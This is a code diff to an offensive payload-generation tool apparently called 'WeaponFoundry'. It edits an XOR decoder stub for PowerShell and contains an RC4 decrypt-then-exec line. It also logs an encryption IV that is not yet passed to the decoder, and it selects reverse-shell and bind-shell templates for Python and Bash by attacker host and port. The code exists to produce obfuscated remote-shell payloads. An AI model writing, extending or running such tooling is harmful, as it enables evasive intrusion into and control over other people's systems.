@@ -441,7 +441,7 @@ exec(_rc4(_p,_k))
     @staticmethod
     def get_xor_decoder_powershell(key: bytes) -> str:
         """Generate PowerShell XOR decoder"""
-        key_int = key[0] if len(key) == 1 else key[0]
+        key_int = key[0]
         return f'''
 $k={key_int}
 $d=[System.Convert]::FromBase64String($e)
@@ -534,6 +534,11 @@ class WeaponFoundry:
                 payload_bytes, encryption, key
             )
         
+        # IV is required for decryption but currently not embedded in the decoder stub
+        # TODO: Pass IV to _generate_decoder or prepend to payload
+        if iv:
+            logger.debug(f"Encryption IV generated: {iv.hex() if iv else 'None'}")
+        
         # Generate decoder stub
         decoder_stub = self._generate_decoder(encryption, key, format)
         
@@ -570,9 +575,8 @@ class WeaponFoundry:
             elif format == PayloadFormat.BASH:
                 return self.templates.get_reverse_shell_bash(lhost, lport)
         
-        elif shell_type == ShellType.BIND_TCP:
-            if format == PayloadFormat.PYTHON:
-                return self.templates.get_bind_shell_python(lport)
+        elif shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
+             return self.templates.get_bind_shell_python(lport)
         
         # Default fallback
         return self.templates.get_reverse_shell_python(lhost, lport)
